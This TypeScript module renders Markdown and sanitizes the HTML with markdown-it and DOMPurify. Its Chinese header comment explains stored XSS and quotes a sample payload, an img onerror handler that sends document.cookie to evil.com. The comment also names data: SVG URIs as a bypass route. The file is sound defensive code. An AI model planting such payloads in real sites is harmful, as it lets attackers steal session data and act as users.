/**
 * Markdown 渲染 + 清洗
 * ------------------------------------------------------------
 * ⚠️ 这个文件是安全边界，改动前先读 docs/security.md 的 R3。
 *
 * 为什么必须清洗？
 *   后端只存 Markdown **原文**，不做渲染。如果前端直接把渲染结果塞进
 *   v-html，任何作者都能在正文里写：
 *     <img src=x onerror="fetch('//evil.com?c='+document.cookie)">
 *   虽然 token 在 httpOnly cookie 里偷不到，但这段脚本可以**以当前用户身份
 *   发请求**（改文章、删文章）。这叫存储型 XSS，是内容站最典型的漏洞。
 *
 * 两道闸，缺一不可：
 *   1. markdown-it 的 html: false —— 原始 HTML 标签被当成普通文本转义，
 *      不会进入 DOM。这一步已经挡掉绝大多数攻击。
 *   2. DOMPurify.sanitize —— 兜底。即使哪天有人把 html 改成 true，
 *      或者某个插件生成了危险属性，这里还会再洗一遍。
 *
 * 顺序不能反：先渲染成 HTML，再清洗 HTML。
 * 反过来（先清洗 Markdown 再渲染）等于没洗 —— 危险内容是在渲染期才产生的。
 */
import MarkdownIt from 'markdown-it'
import DOMPurify from 'dompurify'

const md = new MarkdownIt({
  // 不允许正文里写原始 HTML。这一条比任何黑名单都可靠
  html: false,
  // 自动把裸链接变成 <a>，作者不用手写 []()
  linkify: true,
  // 单个换行不当作 <br>，符合 Markdown 原意（中文写作常一段一行，开了会很碎）
  breaks: false,
  typographer: false,
})

/**
 * 渲染并清洗
 * @param source Markdown 原文
 * @returns 可以直接交给 v-html 的安全 HTML
 */
export function renderMarkdown(source: string): string {
  if (!source) return ''

  const rawHtml = md.render(source)

  return DOMPurify.sanitize(rawHtml, {
    // 允许的标签保持默认白名单即可（p/h1-h6/ul/ol/li/blockquote/pre/code/a/img/table...）
    // 额外允许 target，方便以后给外链加新窗口打开
    ADD_ATTR: ['target', 'rel'],
    // 禁止 data: 协议的图片和链接。
    // data:image/svg+xml 里可以带脚本，是个经典绕过点
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  })
}

/** 生成文章摘要用的纯文本（列表页兜底用，避免把 HTML 塞进摘要） */
export function toPlainText(source: string): string {
  return source
    .replace(/```[\s\S]*?```/g, ' ')
    .replace(/!\[[^\]]*\]\([^)]*\)/g, ' ')
    .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/[#>*_`~-]/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()
}
